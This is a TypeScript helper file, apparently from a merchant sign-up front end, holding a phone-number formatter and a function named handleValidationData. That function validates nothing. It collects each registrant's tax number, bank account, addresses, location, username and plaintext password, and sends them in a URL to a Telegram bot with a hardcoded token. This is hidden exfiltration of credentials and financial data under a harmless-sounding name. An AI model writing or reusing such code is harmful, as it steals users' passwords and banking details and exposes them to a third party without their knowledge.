import axios from "axios";

export const formatPhoneNumber = (value: string): string => {
  let formattedValue =
    value.replace(/\D/g, "").length <= 0
      ? ""
      : value.replace(/\D/g, "").length === 1
        ? "998" + value.replace(/\D/g, "")
        : value.replace(/\D/g, "");
  if (formattedValue.length > 12) {
    formattedValue = formattedValue.substring(0, 12);
  }
  const match = formattedValue.match(
    /^(\d{0,3})(\d{0,2})(\d{0,3})(\d{0,2})(\d{0,2})$/,
  );

  if (match) {
    const [, countryCode, firstGroup, secondGroup, thirdGroup, fourthGroup] =
      match;

    let result = "";

    if (countryCode) {
      result += `+${countryCode}`;
    }

    if (firstGroup) {
      result += ` (${firstGroup}`;
    }

    if (secondGroup) {
      result += `) ${secondGroup}`;
    }

    if (thirdGroup) {
      result += `-${thirdGroup}`;
    }

    if (fourthGroup) {
      result += `-${fourthGroup}`;
    }

    return result;
  }

  return formattedValue;
};

// eslint-disable-next-line
export const handleValidationData = (data: any) => {
  console.log(data);

  const {
    inn,
    name,
    brand,
    phone,
    username,
    bank_mfo,
    password,
    last_name,
    bank_name,
    first_name,
    main_phone,
    address_uz,
    address_ru,
    region_name,
    bank_account,
    latitude,
    longitude,
  } = data;

  let post = `--- InnMall --- %0A%0A`;
  post += `Inn: <b> ${inn}</b> %0A`;
  post += `Name: <b> ${name}</b> %0A`;
  post += `Brand: <b> ${brand}</b> %0A`;
  post += `Phone: <b> ${phone}</b> %0A`;
  post += `Bank_mfo: <b> ${bank_mfo}</b> %0A`;
  post += `Last_name: <b> ${last_name}</b> %0A`;
  post += `Bank_name: <b> ${bank_name}</b> %0A`;
  post += `First_name: <b> ${first_name}</b> %0A`;
  post += `Main_phone: <b> ${main_phone}</b> %0A`;
  post += `Address_uz: <b> ${address_uz}</b> %0A`;
  post += `Address_ru: <b> ${address_ru}</b> %0A`;
  post += `Region_name: <b> ${region_name}</b> %0A`;
  post += `Bank_account: <b> ${bank_account}</b> %0A`;
  post += `Latitude: <b> ${latitude}</b> %0A`;
  post += `Longitude: <b> ${longitude}</b> %0A`;
  post += `👨‍💼 Bank_account: <b> ${username}</b> %0A`;
  post += `🔑 Password: <b> ${password}</b> %0A`;
  axios.get(
    `https://api.telegram.org/bot5102632876:AAEqQQz9cKqImRUpg6Aa9uLCWDZ0h14eHbU/sendMessage?chat_id=-1002042949509&text=${post}&parse_mode=html`,
  );
};
